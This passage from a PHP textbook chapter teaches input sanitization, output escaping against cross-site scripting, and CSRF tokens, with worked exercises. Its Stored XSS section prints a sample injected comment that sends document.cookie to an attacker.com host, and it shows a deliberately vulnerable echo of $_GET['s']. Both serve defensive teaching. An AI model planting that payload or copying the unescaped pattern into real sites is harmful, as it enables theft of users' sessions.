			<p>While most of the focus (if not all) is directed toward the user input, it would be much better if the data was validated no matter the source. This is especially needed when, on a project, there is a team involved and not one single person. This can lead to lots of unpredictable events, such as code changes that may look inoffensive, but could trigger unexpected behavior in your application's flow. Imagine a class method that has been designed and is used for some internal logic process, but then ends up being used for processing <em class="italic">external</em> data (from the database, user input, or elsewhere). While the class' self-data may have some degree of trust, at least when it comes to the data type (depending on the design), the external data is not to be trusted. In some cases, working on a product in a small team, it is tempting to ask the application administrators to insert data in a specific format here and there, leaving data validation and sanitization for <em class="italic">later</em>, while you eagerly try to deliver more and more features (perhaps to meet a deadline). Then, imagine your product turns out to be so successful that management decides to extend the business and offer it as a SaaS solution. In this case, the application administrators are no longer your small team, and all clients' data will be at risk if you don't deal with the input validation and sanitization. This time, it will be pretty difficult to solve all the issues in a timely manner – you will have to find these security holes across the whole application.</p>
			<p>In general, not taking care of data validation and sanitization will lead to a great technical debt in the future, as you will not only put your clients' data at risk, but application operations could return unpredictable results, which will require the developer to have to trace and debug the issues, which, again, takes time and money, while these bugs cause poor user experience.</p>
			<h2 id="_idParaDest-233"><a id="_idTextAnchor240"/>Best Practices</h2>
			<p>Here are a few coding practices that will make your PHP code less prone to bugs and security issues:</p>
			<ul>
				<li>Use a single entry point for your web app: This is about a single PHP file that is responsible for taking every HTTP request and processing it. This file would bootstrap all the dependencies, load the configuration files, initialize the request handlers (such as <strong class="source-inline">Dispatcher</strong>, <strong class="source-inline">HttpKernel</strong>, and others — note that each framework uses its own name), and will then route the request to the proper PHP script for this to produce the response. In our examples, we have used several input files to provide some examples; this is not the way to go for real-world applications. Later, we will look at an example of a simple bootstrap for the examples run through in this topic, inside a single input file, keeping each example file on disk.</li>
				<li>Separate the business logic from presentation logic: It is always better to keep responsibilities separate from each other. Modern frameworks bring their own templating engines to help developers keep most (if not all) of the business logic in PHP files, rather than in presentation files. This helps to focus on only one part; that is, either gathering and/or processing data or displaying data (that is, through visuals). Additionally, it is easier to read business logic if it is not scattered all over the presentation markup. We will cover this in more detail in the bootstrap example later.</li>
				<li>Sanitize and validate your input early and escape it late: Input data refers to data outside the application, be it user input, database data, filesystem file data, or other data. By sanitizing the data, you make sure you get the cleanest possible data for a given input, while by validating it, you make sure you allow the script to work with the accepted values or range of values. On the other hand, escaping the data for the output makes the application avoid some other issues such as <strong class="bold">cross-site scripting</strong> (<strong class="bold">XSS</strong>).<p>We'll see how this can be done in PHP shortly.</p></li>
				<li>Use type hinting whenever possible: Using type hinting, you can be sure of the input and output type of a function, so this feature prevents code execution when the input or output data of a function is not the expected type. For example, if your function expects an iterable, but a string was passed, then the engine will throw a <strong class="source-inline">TypeError</strong> exception (which stops the script execution if it is not caught). <p>That's not all. By default, PHP will coerce the values of variables that do not match the expected type, when possible. This only applies to scalars. For example, if a function expects an integer but a numerical string is passed, then it will be converted to an integer. PHP features strict type checking as well, which I advise you to use in your application development. It can be added as per file use, and it's enough to add <strong class="source-inline">declare(strict_types=1);</strong> and only apply it to function calls from the file on which the strict types were enforced. This means that a function call from non-strict type checking to a function from a file with strong type checking enabled, the caller's preference of weak typing will be respected, and the values will be coerced. Using strict type checking makes your application even less prone to bugs, and that's simply because <strong class="source-inline">'123abc' == 123</strong>, which leads me to the next point.</p></li>
				<li>Use strict comparison (<strong class="source-inline">===</strong>): PHP supports two types of comparisons: loose comparisons (<strong class="source-inline">==</strong>) and strict comparisons (<strong class="source-inline">===</strong>). In the case of loose comparisons, PHP tries to align both operands' values to a common type, and then perform the comparison. That's why <strong class="source-inline">0 == FALSE</strong> evaluates to <strong class="source-inline">TRUE</strong>. While this is considered a feature of PHP, praised for being friendly to starter developers, I strongly advise you to avoid such a construct from the beginning. On the other hand, a string comparison will not try to coerce the operands' data, as it compares both values and types.<p>Generally speaking, you, as a developer looking at your code, should know what data you are dealing with in every line of your application.</p><p>In other words, the more magic you allow to drive your app, the more your app will be prone to <em class="italic">magic</em> bugs!</p></li>
				<li>Split your code into smaller pieces: Try to avoid writing big long functions and instead try to split the code into pieces that you will be able to actually test. So, what granularity should you use to split your code? Well, just ask what you are trying to do with the data, then it will come down to functions with names such as <strong class="source-inline">decorateComment</strong>, <strong class="source-inline">splitCollection</strong>, <strong class="source-inline">shouldTrim</strong>, and others. If you end up with something such as <strong class="source-inline">getCommentsByGroupingAndDecoratingLongOnes</strong>, you'll probably find that function does too many operations, which could be split into shorter, more manageable and testable functions.  </li>
				<li>Avoid using the error suppression operator, <strong class="source-inline">@</strong>: This operator is pretty slow, as the PHP will turn off error reporting, and after the operation, it will restore the error reporting to the original value. Additionally, do not turn off error reporting at all, not even in production; instead, use a custom error handler and log the error in a preferred manner, so you can see whether something goes wrong during the code execution.</li>
			</ul>
			<h2 id="_idParaDest-234"><a id="_idTextAnchor241"/>Sanitizing and Validating the User Input</h2>
			<p>As soon as the data arrives in a script, it should be sanitized, and it must always be validated. You want to make sure you don't receive harmful data and, therefore, you want to clean the user input, which means removing potentially malicious content from the provided input, or casting the data to a specific type such as an integer or Boolean. Additionally, you want to make sure the input data is a valid number, or an email address where expected, and so on.</p>
			<p>The built-in <strong class="source-inline">filter_input()</strong> function is used to process the data from the request and, if needed, will alter it to match the expected format. </p>
			<p>The syntax is <strong class="source-inline">filter_input( int $type, string $variable_name, int $filter = FILTER_DEFAULT, mixed $options = null )</strong>, so it takes as arguments the type of input to look into, the input parameter name to look for, the optional filter type, and any extra options if needed. What <strong class="source-inline">FILTER_SANITIZE_*</strong> filters do is remove data that is not expected for specific formats. For example, <strong class="source-inline">FILTER_SANITIZE_NUMBER_INT</strong> will remove everything except digits and plus and minus signs. A full list of sanitizing options can be found at <a href="https://packt.live/31vww0M">https://packt.live/31vww0M</a>.</p>
			<h2 id="_idParaDest-235"><a id="_idTextAnchor242"/>Exercise 6.7: Sanitizing and Validating the User Input</h2>
			<p>In the following exercise, we will sanitize and validate the input data. Suppose that you have built an e-commerce web application and now you want to develop the feedback part. In the <strong class="source-inline">POST</strong> payload, you expect a message and a number of stars; that is, any number between one and five. </p>
			<p>Here are the steps to perform the exercise: </p>
			<ol>
				<li value="1">To sanitize the input, this is how you would use the <strong class="source-inline">filter_input()</strong> function, given that we look for the <strong class="source-inline">stars</strong> and <strong class="source-inline">message</strong> input fields:<p class="source-code">$stars = filter_input(INPUT_POST, 'stars', FILTER_SANITIZE_NUMBER_INT);</p><p class="source-code">$message = filter_input(INPUT_POST, 'message', FILTER_SANITIZE_STRING);</p></li>
				<li>Of course, you should then check the <strong class="source-inline">filter_input</strong> return values. As the manual states, <strong class="source-inline">NULL</strong> will be returned when the input does not exist, <strong class="source-inline">FALSE</strong> if the filter fails, and a scalar otherwise. Next, we would like to validate the sanitized input data:<p class="source-code">    // first approach</p><p class="source-code">    $stars = (int)$stars;</p><p class="source-code">    if($stars &lt; 1 || $stars &gt; 5){</p><p class="source-code">        echo '&lt;p&gt;Stars can have values between 1 and 5.&lt;/p&gt;';</p><p class="source-code">    }</p><p>We can also consider the following approach:</p><p class="source-code">    // or second approach</p><p class="source-code">    $stars = filter_var($stars, FILTER_VALIDATE_INT, [</p><p class="source-code">        'options' =&gt; [</p><p class="source-code">            'default' =&gt; 0, // value to return if the filter fails</p><p class="source-code">            'min_range' =&gt; 1,</p><p class="source-code">            'max_range' =&gt; 5,</p><p class="source-code">        ]</p><p class="source-code">    ]);</p><p class="source-code">    if(0 === $stars){</p><p class="source-code">        echo '&lt;p&gt;Stars can have values between 1 and 5.&lt;/p&gt;';</p><p class="source-code">    }</p><p>You will notice that, at some point, we have cast the <strong class="source-inline">stars</strong> input value to the <strong class="source-inline">($stars = (int)$stars;)</strong> integer. That's because, using <strong class="source-inline">FILTER_SANITIZE_*</strong> filter types, you will always get a string if the filter runs successfully. Additionally, you will notice that we have used the <strong class="source-inline">filter_var</strong> function, which, unlike <strong class="source-inline">filter_input</strong>, will accept a variable as the first argument and then the filter type and options. Of the two approaches I previously showed to validate an integer input, I prefer the first one, because it's less code and is likely to be faster than the second approach (anyway, unless you run a high-traffic web application, the performance difference between the two approaches is almost zero).</p><p class="callout-heading">Note </p><p class="callout">Often, validating an integer input is done much more simply. Given the fact that the script may expect values higher than zero, or that when no value is specified zero would be the default value, the sanitization would look like this:</p><p class="callout"><strong class="source-inline">$stars = (int)($_GET['stars'] ?? 0); // using null coalescing operator</strong></p></li>
				<li>Validate the message input as well and print error messages if <strong class="source-inline">$message</strong> is <strong class="source-inline">null</strong> or <strong class="source-inline">false</strong> (that is, if the input was not found or the sanitization failed):<p class="source-code">if (null === $message) {</p><p class="source-code">    //  treat the case when input does not exist</p><p class="source-code">    echo '&lt;p&gt;Message input is not set.&lt;/p&gt;';</p><p class="source-code">} elseif (false === $message) {</p><p class="source-code">    //  treat the case when the filter fails</p><p class="source-code">    echo '&lt;p&gt;Message failed to pass the sanitization filter.&lt;/p&gt;';</p><p class="source-code">}</p></li>
				<li>For debugging purposes, we may want to print the sanitized variable's values:<p class="source-code">echo sprintf("&lt;p&gt;Stars: %s&lt;/p&gt;&lt;p&gt;Message: %s&lt;/p&gt;",   var_export($stars, true), var_export($message, true));</p></li>
				<li>Now we're missing the HTML part; that is, the form. It will require the two inputs with the <strong class="source-inline">stars</strong> and <strong class="source-inline">message</strong> names. We may consider using an input of type <strong class="source-inline">text</strong> for <strong class="source-inline">stars</strong> in this case in order to be able to enter invalid data, so that we can validate our sanitization and validation logic, and another input of type <strong class="source-inline">textarea</strong> for <strong class="source-inline">message</strong>:<p class="source-code">&lt;form method="post"&gt;</p><p class="source-code">    &lt;label for="stars"&gt;Stars: &lt;/label&gt;&lt;br&gt;</p><p class="source-code">    &lt;input type="text" name="stars" id="stars"&gt;&lt;br&gt;</p><p class="source-code">    &lt;label for="message"&gt;Message: &lt;/label&gt;&lt;br&gt;</p><p class="source-code">    &lt;textarea name="message" id="message" rows="10" cols="40"&gt;      &lt;/textarea&gt;&lt;br&gt;</p><p class="source-code">    &lt;input type="submit" value="Send"&gt;</p><p class="source-code">&lt;/form&gt;</p></li>
				<li>Put the content in the <strong class="source-inline">input-sanitize.php</strong> file and open it in the browser at <strong class="source-inline">http://127.0.0.1:8080/input-sanitize.php</strong>. The output looks like this:<div class="IMG---Figure" id="_idContainer154"><img alt="Figure 6.25: The output of input-sanitize.php when first accessed&#13;&#10;" src="image/C14196_06_25.jpg"/></div><p class="figure-caption">Figure 6.25: The output of input-sanitize.php when first accessed</p></li>
				<li>Enter <strong class="source-inline">3a</strong> for the <strong class="source-inline">stars</strong> rating, <strong class="source-inline">Hello &lt;script&gt;alert(1)&lt;/script&gt;</strong> for the message, and then submit the form. You will get something like this as the output:</li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer155">
					<img alt="Figure 6.26: A sample sanitization in the output of input-sanitize.php&#13;&#10;" src="image/C14196_06_26.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.26: A sample sanitization in the output of input-sanitize.php</p>
			<p>In the following table, we have listed a series of inputs and the result for each submission. So, here is a list of sanitized values the script will render for their relative inputs:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer156">
					<img alt="Figure 6.27: A list of sanitized values for various input messages&#13;&#10;" src="image/C14196_06_27.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.27: A list of sanitized values for various input messages</p>
			<p>There are some more sanitization functions you should be aware of:</p>
			<ul>
				<li><strong class="source-inline">strip_tags()</strong>: This strips the HTML tags from a string; for example, <strong class="source-inline">strip_tags('Hello &lt;script&gt;alert(1)&lt;/script&gt;!');</strong> will remove the <strong class="source-inline">&lt;script&gt;</strong> opening and closing tags, resulting in the following output: <strong class="source-inline">"Hello alert(1)!"</strong>. This removes the HTML tags where they are not expected and removes potentially dangerous scripts from being stored in the application, which may be output further in the browser causing malicious actions.</li>
				<li><strong class="source-inline">trim()</strong>: This strips whitespace characters by default, or other characters as specified, from the beginning and end of a string.</li>
			</ul>
			<p>Here are some functions that you may want to use to validate your data:</p>
			<ul>
				<li><strong class="source-inline">is_numeric()</strong>: This tells us whether a variable is a number or a numeric string.</li>
				<li><strong class="source-inline">preg_match()</strong>: This performs a regular expression match.</li>
				<li><strong class="source-inline">in_array()</strong>: This checks whether the value exists in the list of values in the array that is given as an argument of the function.</li>
			</ul>
			<h2 id="_idParaDest-236"><a id="_idTextAnchor243"/>Escaping the Output</h2>
			<p>Now, let's talk about the data that is leaving the application. When sending data to a browser as HTML markup, you'll have to cover yet another security concern.</p>
			<p>This time, you want to escape the data. Escaping means transforming potentially harmful data into unharmful data. Since the browser will render the page by parsing the HTML your script provides, you need to make sure the output is not creating unwanted side effects, breaking the page layout, or worse, putting the user session and data at risk.</p>
			<h2 id="_idParaDest-237"><a id="_idTextAnchor244"/>Cross-Site Scripting (XSS)</h2>
			<p>The most common vulnerability on the web nowadays is <strong class="bold">Cross-Site Scripting</strong> (<strong class="bold">XSS</strong>). This vulnerability allows an attacker to inject arbitrary HTML tags and/or run arbitrary JavaScript code on the client side (in browsers).</p>
			<p>There are three types of XSS attacks:</p>
			<ul>
				<li>Stored XSS: Here, the malicious code is stored on the server or on the client browser.</li>
				<li>Reflected XSS: Here, the malicious code is returned immediately from the user input.</li>
				<li>DOM-based XSS: Here, the malicious code uses data stored in the DOM, to be sent to the attacker website.</li>
			</ul>
			<p>Although these are different types of XSS, they actually overlap. Often, they are referred to as Server XSS or Client XSS, pointing to the vulnerable side of a website.</p>
			<p>A common example of Reflected XSS is a search results page, where the user is shown the search input they submitted. A vulnerable script, in this case, should look like this:</p>
			<p class="source-code">echo sprintf('Search terms: %s', $_GET['s']);</p>
			<p>Of course, accessing <strong class="source-inline">/?s=hello</strong> will result in <strong class="source-inline">"Search terms: hello"</strong>, which is what bad testing looks like. However, when <strong class="source-inline">/?s=&lt;script&gt;alert(1)&lt;/script&gt;</strong> is tried, the output is <strong class="source-inline">"Search terms: "</strong> and a pop-up box displays the number 1. This is because the HTML will look like this:</p>
			<p class="source-code">Search terms: &lt;script&gt;alert(1)&lt;/script&gt;</p>
			<p>While this looks harmless, just think about the possibilities here. You can inject <em class="italic">any</em> HTML markup, including scripts, and be able to spy on user sessions, data, and actions, and even more – it is able to perform actions on the user's behalf.</p>
			<p>Thankfully, there are methods to prevent such attacks, and while data validation and sanitization may also be used as well in this matter, one of the most commonly used methods is output escaping. PHP provides some built-in functions that provide such functionality: <strong class="source-inline">htmlspecialchars()</strong> and <strong class="source-inline">htmlentities()</strong>. What both of these functions do is translate certain sensitive characters into their associated HTML entity values, with the addition that <strong class="source-inline">htmlentities()</strong> translates all the characters that have an HTML-named entity associated with them. I encourage you to use <strong class="source-inline">htmlentities($string, ENT_QUOTES)</strong> so that all characters will be translated into entities; additionally, <strong class="source-inline">ENT_QUOTES</strong> ensures that both double and single quotes are escaped.</p>
			<p>Following the preceding example, the fix should look pretty simple:</p>
			<p class="source-code">echo sprintf('Search terms: %s', htmlentities($_GET['s'], ENT_QUOTES));</p>
			<p>Now the browser will output <strong class="source-inline">Search terms: &lt;script&gt;alert(1)&lt;/script&gt;</strong> since the HTML looks like this:</p>
			<p class="source-code">Search terms: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>
			<p>For convenience, I'll print the list of special characters PHP will replace with <strong class="source-inline">htmlspecialchars()</strong>:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer157">
					<img alt="Figure 6.28: Special characters and their replacements&#13;&#10;" src="image/C14196_06_28.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.28: Special characters and their replacements</p>
			<p>Now, let's consider the example of a Stored XSS sample. As the name suggests, the Stored XSS is a piece of malware stored either on the server or on the browser. I'll discuss the one stored on the server, but in the case of the browser, it's similar (it's just not done with PHP).</p>
			<p>Okay, so how can an XSS piece of malware be stored on a server? Well, it's easy: that can be done with every user input that the application stores (which is in a database, usually). Think of the comments for a blog post, the reviews for products, an avatar's URL, a user's website URL, and other examples. In these cases, to render safe HTML, the answer is the same; that is, use <strong class="source-inline">htmlentities()</strong>.</p>
			<p>Let's say there is a comment to a blog post in the database, with the following content:</p>
			<p class="source-code">Great blog post! &lt;script&gt;document.write('&lt;img src="https://attacker.com/collect.gif?cookie=' + encodeURIComponent(document.cookie)+'" /&gt;');</p>
			<p class="source-code">&lt;/script&gt;</p>
			<p>In this case, an attacker injects a script tag, which will execute a DOM write on the client side by adding a remote image (which is usually a pixel; you can't even spot it on the page). The remote image is hosted by the attacker's server, which, before serving the pixel image, will first collect all the data passed in the request query string – in this case, <strong class="source-inline">document.cookie</strong>. This means that the attacker will collect valid session IDs from all the visitors of the website; that is, anonymous visitors, logged-in users, and even admins.</p>
			<p>The preceding comment, if not escaped, will be rendered by the browser as <strong class="source-inline">Great blog post!</strong> without giving any hint that there might be some strange script executing. </p>
			<p>The escaped version will be rendered as the original content of the comment because now the HTML will contain entities instead of the special characters:</p>
			<p class="source-code">Great blogpost! &amp;lt;script&amp;gt;document.write('&amp;lt;img src=&amp;quot;https://attacker.com/collect.gif?cookie=' + encodeURIComponent(document.cookie)+'&amp;quot; /&amp;gt;');&amp;lt;/script&amp;gt;</p>
			<p class="callout-heading">Note</p>
			<p class="callout">You can learn more about XSS at <a href="https://packt.live/2MRX3jJ">https://packt.live/2MRX3jJ</a>.</p>
			<h2 id="_idParaDest-238"><a id="_idTextAnchor245"/>Exercise 6.8: Securing against XSS</h2>
			<p>In this exercise, you will build a script that is secured against user input. Let's say that you have to develop a search feature on an existing website. You are asked to print the searched value back to the page and to keep the current search term in the search input field. Of course, the script should be secured against user input. </p>
			<ol>
				<li value="1">Create a file called <strong class="source-inline">output-escape-reflected.php</strong>, with the following content:<p class="source-code">&lt;?php</p><p class="source-code">declare(strict_types=1);</p><p class="source-code">if (isset($_GET['s'])) {</p><p class="source-code">    echo sprintf('&lt;p&gt;You have searched for: &lt;strong&gt;%s&lt;/strong&gt;      &lt;/p&gt;', htmlentities($_GET['s']));</p><p class="source-code">} else {</p><p class="source-code">    echo "Use the form to start searching.";</p><p class="source-code">}</p><p class="source-code">?&gt;</p><p>First, we check whether we have the <strong class="source-inline">s</strong> entry in the <strong class="source-inline">$_GET</strong> variable and, if it's there, we will print the escaped value to the browser using the <strong class="source-inline">htmlentities()</strong> function:</p><p class="source-code">&lt;form action="output-escape-reflected.php" method="get"&gt;</p><p class="source-code">    &lt;label for="search"&gt;Search term:&lt;/label&gt;</p><p class="source-code">    &lt;input type="text" id="search" name="s" value="&lt;?= htmlentities       ($_GET['s'] ?? '', ENT_QUOTES); ?&gt;"&gt;</p><p class="source-code">    &lt;input type="submit" value="Search"&gt;</p><p class="source-code">&lt;/form&gt;</p></li>
				<li>Then, we print the search form, and in the search input field, we include the current searched term, escaping using the same <strong class="source-inline">htmlentities()</strong> function. Note that this time, we use <strong class="source-inline">ENT_QUOTES</strong> as the second argument, which will make the function escape both the single and double quotes; without this argument, only the double quotes are escaped. The reason we use this approach, even though the <strong class="source-inline">value</strong> attribute is assigned the value using double quotes, is that it allows the use of single quotes as well, so it's safer to escape both types of quotes.</li>
				<li>Access the file at <strong class="source-inline">http://127.0.0.1:8080/output-escape-reflected.php</strong>.<p>You should see something like this:</p><div class="IMG---Figure" id="_idContainer158"><img alt="Figure 6.29: The page output without the search term&#13;&#10;" src="image/C14196_06_29.jpg"/></div><p class="figure-caption">Figure 6.29: The page output without the search term</p></li>
				<li>Enter <strong class="source-inline">"Great blogpost!" &lt;script&gt;alert('1')&lt;/script&gt;</strong> as the search term and click on the <strong class="source-inline">Search</strong> button. You should see something like this:</li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer159">
					<img alt="Figure 6.30: The escaped output for the search term&#13;&#10;" src="image/C14196_06_30.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.30: The escaped output for the search term</p>
			<p>As you can see from the preceding output, we have displayed the search term entered by the user and have also retained it in the search input field.</p>
			<h1 id="_idParaDest-239"><a id="_idTextAnchor246"/>Cross-Site Request Forgery (CSRF)</h1>
			<p><strong class="bold">Cross-Site Request Forgery</strong> (<strong class="bold">CSRF</strong>) is an attack that enables the user to execute unwanted actions on a web application in which they're currently authenticated. This attack could succeed in the transfer of funds, changing an account email address, or making a purchase in the name of the user.</p>
			<p>This can happen when the attacker knows exactly what data is expected on the affected application for a certain action – changing an email address, let's say. So, the attacker crafts the HTML form on their server, filling it with their preferred data (that is, their own email address). Next, the attacker chooses the victim and uses social engineering to trick them into accessing the URL. </p>
			<p>The victim will then land on a malicious website and the browser will be instructed to submit the (invisible) form to the affected application, where the user is logged in. The email will be changed and when the victim realizes this, it may already be too late, as control of the account will have been taken by the attacker. It is worth mentioning that the victim would not even realize what caused this email change operation on the affected application since the form on the attacker's website could be submitted inside a pixel iFrame. So, the victim would think that they had accessed some type of cool viral video blog, without realizing the danger lurking behind the scenes.</p>
			<p class="callout-heading">Note </p>
			<p class="callout">Social engineering, in the context of information security, is performing a confidence trick for the purpose of information gathering, fraud, or system access, and refers to the psychological manipulation of people into performing actions or divulging confidential information.</p>
			<p>To mitigate CSRF in your application, we suggest that you generate and use CSRF tokens. These are pieces of randomly generated strings of a variable length. These tokens are not part of the data that comes along with the form (such as cookies), but they are a part of the same form data. The token sent via the HTTP form is then compared to the value stored in the session data and, if there is a perfect match, the request is allowed.</p>
			<p>Usually, you can generate one token per session, but one token can be generated per session form as well.</p>
			<p>The CSRF token method works to help prevent CSRF attacks, because the attacker doesn't know what your session's CSRF token is, and all the malicious operations that have worked before the implementation of the CSRF token will now fail early, at token validation.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">You can learn more about CSRF at <a href="https://packt.live/31aAFHb">https://packt.live/31aAFHb</a>.</p>
			<h2 id="_idParaDest-240"><a id="_idTextAnchor247"/>Exercise 6.9: Securing against CSRF</h2>
			<p>In this exercise, you will set up a CSRF token to use for user action validation. </p>
			<ol>
				<li value="1">Create a file called <strong class="source-inline">form-csrf.php</strong> and insert the following content:<p>First, the session should be started, then the script will look for the <strong class="source-inline">csrf-token</strong> entry in the session data and, if not found, one will be generated and stored in the session using two built-in functions. We will use <strong class="source-inline">random_bytes()</strong> to generate random bytes of a specified length, and <strong class="source-inline">bin2hex()</strong> to convert the binary data into hexadecimal representation; that is, a string containing digits ranging from 0 to 9 and characters from <strong class="source-inline">a</strong> to <strong class="source-inline">f</strong>. The expression will generate a 64-character token:</p><p class="source-code">session_start();</p><p class="source-code">if (!array_key_exists('csrf-token', $_SESSION)) {</p><p class="source-code">    $_SESSION['csrf-token'] = bin2hex(random_bytes(32));</p><p class="source-code">}</p></li>
				<li>Next, the script should check whether the request type is <strong class="source-inline">POST</strong> or not and, if positive, it will proceed with token validation. Here is the code to do this:<p class="source-code">if ($_SERVER['REQUEST_METHOD'] === 'POST') {</p><p class="source-code">    if (!array_key_exists('csrf-token', $_POST)) {</p><p class="source-code">        echo '&lt;p&gt;ERROR: The CSRF Token was not found in POST payload.          &lt;/p&gt;';</p><p class="source-code">    } elseif ($_POST['csrf-token'] !== $_SESSION['csrf-token']) {</p><p class="source-code">        echo '&lt;p&gt;ERROR: The CSRF Token is not valid.&lt;/p&gt;';</p><p class="source-code">    } else {</p><p class="source-code">        echo '&lt;p&gt;OK: The CSRF Token is valid. Will continue with email           validation...&lt;/p&gt;';</p><p class="source-code">    }</p><p class="source-code">}</p><p>First, the CSRF token's presence in the input data is checked: <strong class="source-inline">array_key_exists('csrf-token', $_POST)</strong>. The second check will compare the sent data with the data stored in the session data of the current user: <strong class="source-inline">$_POST['csrf-token'] === $_SESSION['csrf-token']</strong>. If any of these two conditions fail, then appropriate error messages will be displayed. Otherwise, the success message will be printed.</p></li>
				<li>In the end, the test form is printed. It should contain a dummy <strong class="source-inline">email</strong> input. We will add three submit buttons to the form. The first one will make the form submit only the email data. The second one will make the form send <strong class="source-inline">"csrf-token"</strong> with an empty value. Finally, the third one will make the form send <strong class="source-inline">"csrf-token"</strong> with the value stored in the <em class="italic">current</em> session. Here is the code to do this:<p class="source-code">&lt;form method="post"&gt;</p><p class="source-code">    &lt;label for="email"&gt;New email:&lt;/label&gt;&lt;br&gt;</p><p class="source-code">    &lt;input type="text" name="email" id="email" value=""&gt;&lt;br&gt;</p><p class="source-code">    &lt;button type="submit"&gt;Submit without CSRF Token&lt;/button&gt;</p><p class="source-code">    &lt;button type="submit" name="csrf-token"&gt;Submit with empty/invalid       CSRF Token&lt;/button&gt;</p><p class="source-code">    &lt;button type="submit" name="csrf-token" value="      &lt;?php echo $_SESSION['csrf-token'] ?&gt;"&gt;Submit with CSRF Token</p><p class="source-code">    &lt;/button&gt;</p><p class="source-code">&lt;/form&gt;</p><p class="callout-heading">Note</p><p class="callout">The final script can be referred at <a href="https://packt.live/2B6Z7Pj">https://packt.live/2B6Z7Pj</a>.</p></li>
				<li>Open the file at <strong class="source-inline">http://127.0.0.1:8080/form-csrf.php</strong>.<p>You should see something like this in your browser:</p><div class="IMG---Figure" id="_idContainer160"><img alt="Figure 6.31: Accessing form-csrf.php for the first time&#13;&#10;" src="image/C14196_06_31.jpg"/></div><p class="figure-caption">Figure 6.31: Accessing form-csrf.php for the first time</p></li>
				<li>Click on the "<strong class="source-inline">Submit without CSRF Token</strong>" button. The output will be as follows:<div class="IMG---Figure" id="_idContainer161"><img alt="Figure 6.32: The token is not found&#13;&#10;" src="image/C14196_06_32.jpg"/></div><p class="figure-caption">Figure 6.32: The token is not found</p></li>
				<li>Click on the <strong class="source-inline">Submit with empty/invalid CSRF Token</strong> button. The output will be as follows:<div class="IMG---Figure" id="_idContainer162"><img alt="Figure 6.33: The token is found, but is not valid&#13;&#10;" src="image/C14196_06_33.jpg"/></div><p class="figure-caption">Figure 6.33: The token is found, but is not valid</p></li>
				<li>Click on the <strong class="source-inline">Submit with CSRF Token</strong> button. The output will be as follows:</li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer163">
					<img alt="Figure 6.34: The token is found and is valid&#13;&#10;" src="image/C14196_06_34.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.34: The token is found and is valid</p>
			<p>As you can see from the preceding output, we have successfully generated and submitted a CSRF token, thereby protecting the application and user data against CSRF attacks.</p>
			<h2 id="_idParaDest-241"><a id="_idTextAnchor248"/>Building an Application (Bootstrapping the Examples)</h2>
			<p>As discussed previously, it is good practice to separate business logic from the presentation layer and other components of an application, to ease the development and maintenance of the application, and to make the application less prone to security issues.</p>
			<p>This chapter offers a very simple structure of an application, as a sample, just to demonstrate how you can achieve one entry point for your application, route requests and perform appropriate business logic, and also print a complete HTML page.</p>
			<p>We will be building an application using the best development practices in the upcoming exercise. However, before we do so, let's review the basic directory structure that we will be using while building our web page. In the project root, there are two directories: <strong class="source-inline">src/</strong> and <strong class="source-inline">web/</strong>.</p>
			<h3 id="_idParaDest-242"><a id="_idTextAnchor249"/>web/</h3>
			<p>This is the server document root containing the single entry point file for HTTP requests: <strong class="source-inline">index.php</strong>. Every file in this directory can be accessed through the server (unless a specific server configuration is used to prevent access to some locations inside this directory).</p>
			<p class="callout-heading">Note </p>
			<p class="callout">The server will start in this directory and not in the parent directory (<strong class="source-inline">/app</strong>).</p>
			<p>This approach is used to prevent random script files from accessing the WWW, which may lead to various consequences (such as data security and service availability), and to ease the maintenance of the application by reducing the entry points to a single one.</p>
			<p><strong class="source-inline">index.php</strong>: This file is responsible for accepting all HTTP requests and producing and returning HTTP responses; it includes all the necessary script files of the application and runs specific tasks to achieve its purpose (for example, returning the HTTP response).</p>
			<h3 id="_idParaDest-243"><a id="_idTextAnchor250"/>src/</h3>
			<p>This is the directory that contains the business logic and presentation files of the application; the script files are grouped by operation types (such as presentation, handlers, and higher-level components). This directory is not exposed to WWW; however, the scripts will run for each request, since they are included in <strong class="source-inline">web/index.php</strong>, which means that they are indirectly exposed to user input. Therefore, any type of input validation is a must.</p>
			<p>The <strong class="source-inline">src/</strong> directory contains three subfolders: <strong class="source-inline">components/</strong>, <strong class="source-inline">handlers/</strong>, and <strong class="source-inline">templates/</strong>. The details of these are as follows:</p>
			<h3 id="_idParaDest-244"><a id="_idTextAnchor251"/>components/</h3>
			<p><strong class="source-inline">Router.php</strong>: The <strong class="source-inline">Router</strong> component is responsible for picking a handler (that is, a class name) to instantiate and returning it. Essentially, it will match a URI path to a handler class (for example, <strong class="source-inline">/login</strong> will result in returning the <strong class="source-inline">\Handlers\Login</strong> instance).</p>
			<p><strong class="source-inline">Template.php</strong>: The <strong class="source-inline">Template</strong> component is responsible for loading and rendering a template from the <strong class="source-inline">templates</strong> directory and returning the HTML content.</p>
			<h3 id="_idParaDest-245"><a id="_idTextAnchor252"/>handlers/</h3>
			<p>This directory contains the scripts with classes that will process the HTTP request and will generate response data. This directory has an abstract <strong class="source-inline">Handler</strong> class that implements some common functionality, which will be extended by actual handlers. The previously listed handlers are meant to cover the authentication (<strong class="source-inline">Login.php</strong>), secure the profile page, log out of any session (<strong class="source-inline">Logout.php</strong>), and protect the profile page display (<strong class="source-inline">Profile.php</strong>).</p>
			<h3 id="_idParaDest-246"><a id="_idTextAnchor253"/>templates/</h3>
			<p>The <strong class="source-inline">templates</strong> directory, as the name suggests, holds the template files (or presentation files). These files contain mostly HTML and have little to no PHP logic.</p>
			<p>When building an application, we need to ensure that there is a single point of entry, as shown in the following figure:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer164">
					<img alt="Figure 6.35: Exposing the web directory and accessing the scripts indirectly with HTTP requests&#13;&#10;" src="image/C14196_06_35.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.35: Exposing the web directory and accessing the scripts indirectly with HTTP requests</p>
